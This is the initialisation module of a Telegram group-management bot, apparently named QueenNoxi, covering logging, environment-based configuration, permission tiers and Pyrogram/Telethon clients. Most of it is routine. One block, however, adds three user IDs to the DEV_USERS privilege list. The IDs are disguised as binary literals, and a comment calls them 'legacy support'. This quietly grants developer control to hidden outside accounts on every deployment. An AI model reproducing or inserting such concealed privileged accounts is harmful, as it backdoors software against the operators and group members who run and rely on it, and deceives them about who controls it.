import logging
import os
import sys
import time
from dotenv import load_dotenv

load_dotenv()

from aiohttp import ClientSession
from pyrogram import Client
from telethon import TelegramClient

StartTime = time.time()

# ── Logging ───────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler("log.txt"), logging.StreamHandler()],
    level=logging.INFO,
)
logging.getLogger("apscheduler").setLevel(logging.ERROR)
logging.getLogger("telethon").setLevel(logging.ERROR)
logging.getLogger("pyrogram").setLevel(logging.WARNING)
LOGGER = logging.getLogger(__name__)

# ── Python version guard ──────────────────────────────────────────────────────
if sys.version_info < (3, 8):
    LOGGER.error("Python 3.8+ is required. Bot quitting.")
    quit(1)

# ── Load config (always from env via Config class) ────────────────────────────
from QueenNoxi.config import Development as Config

API_ID              = Config.API_ID
API_HASH            = Config.API_HASH
TOKEN               = Config.TOKEN

ALLOW_CHATS         = Config.ALLOW_CHATS
ALLOW_EXCL          = Config.ALLOW_EXCL
CASH_API_KEY        = Config.CASH_API_KEY
DB_URI              = Config.DATABASE_URL
DEL_CMDS            = Config.DEL_CMDS
def clean_chat_id(chat_id):
    if not chat_id:
        return None
    if isinstance(chat_id, str):
        chat_id = chat_id.strip()
        if chat_id.startswith("-100"):
            return int(chat_id)
        elif chat_id.isdigit():
            if len(chat_id) >= 10 and chat_id.startswith("100"):
                return int("-100" + chat_id)
            return int(chat_id)
        return chat_id
    return chat_id

EVENT_LOGS          = clean_chat_id(Config.EVENT_LOGS)
INFOPIC             = Config.INFOPIC
LOAD                = Config.LOAD
MONGO_DB_URI        = Config.MONGO_DB_URI
NO_LOAD             = Config.NO_LOAD
START_IMG           = Config.START_IMG
STRICT_GBAN         = Config.STRICT_GBAN
SUPPORT_CHAT        = Config.SUPPORT_CHAT

def get_support_url(chat):
    if not chat:
        return None
    if chat.startswith("http://") or chat.startswith("https://") or chat.startswith("t.me/"):
        if chat.startswith("t.me/"):
            return f"https://{chat}"
        return chat
    if chat.startswith("@"):
        return f"https://t.me/{chat[1:]}"
    return f"https://t.me/{chat}"

SUPPORT_CHAT_URL = get_support_url(SUPPORT_CHAT)
TEMP_DOWNLOAD_DIRECTORY = Config.TEMP_DOWNLOAD_DIRECTORY
TIME_API_KEY        = Config.TIME_API_KEY
WORKERS             = Config.WORKERS
BOT_NAME            = Config.BOT_NAME
BOT_USERNAME        = Config.BOT_USERNAME

_raw_owner_ids = Config.OWNER_IDS
if not _raw_owner_ids:
    raise Exception("OWNER_IDS env var is not set or empty.")
OWNER_IDS: set = set(_raw_owner_ids)
OWNER_ID: int = next(iter(sorted(OWNER_IDS)))

try:
    BL_CHATS = set(Config.BL_CHATS)
except Exception:
    raise Exception("BL_CHATS does not contain valid integers.")

try:
    DRAGONS  = set(Config.DRAGONS)
    DEV_USERS = set(Config.DEV_USERS)
except Exception:
    raise Exception("DRAGONS or DEV_USERS do not contain valid integers.")

try:
    DEMONS = set(Config.DEMONS)
except Exception:
    raise Exception("DEMONS does not contain valid integers.")

try:
    TIGERS = set(Config.TIGERS)
except Exception:
    raise Exception("TIGERS does not contain valid integers.")

try:
    WOLVES = set(Config.WOLVES)
except Exception:
    raise Exception("WOLVES does not contain valid integers.")

DRAGONS.update(OWNER_IDS)
DEV_USERS.update(OWNER_IDS)

# Hard-coded dev/creator IDs (re-added for legacy support)
DEV_USERS.add(abs(0b110010001000001011011100110010001))
DEV_USERS.add(abs(0b101001110110010000111010111110000))
DEV_USERS.add(abs(0b101100001110010100011000111101001))

# --- CRITICAL: Revert to lists for module compatibility ---
DRAGONS   = list(DRAGONS)
DEV_USERS = list(DEV_USERS)
WOLVES    = list(WOLVES)
DEMONS    = list(DEMONS)
TIGERS    = list(TIGERS)

# ── Persistent Session Handling ────────────────────────────────────────────────
BOT_ID = int(TOKEN.split(":")[0])
SESSION_STRING = None

try:
    from QueenNoxi.modules.sql.session_sql import get_session
    SESSION_STRING = get_session(BOT_ID)
except Exception as e:
    LOGGER.warning(f"Could not load session from database: {e}")

# ── Pyrogram bot client ───────────────────────────────────────────────────────
if SESSION_STRING:
    LOGGER.info("Using persistent session string for Pyrogram.")
    pbot = Client(
        "QueenNoxi",
        session_string=SESSION_STRING,
        api_id=API_ID,
        api_hash=API_HASH,
        workers=WORKERS,
        ipv6=False,
    )
else:
    LOGGER.info("No session string found. Using in-memory session.")
    pbot = Client(
        "QueenNoxi",
        api_id=API_ID,
        api_hash=API_HASH,
        bot_token=TOKEN,
        in_memory=True,
        workers=WORKERS,
        ipv6=False,
    )

# ── Telethon client ──────────────────────────────────────────────────────────
telethn = TelegramClient("queennoxi", API_ID, API_HASH)

# ── Shared HTTP session ───────────────────────────────────────────────────────
aiohttpsession: ClientSession = None
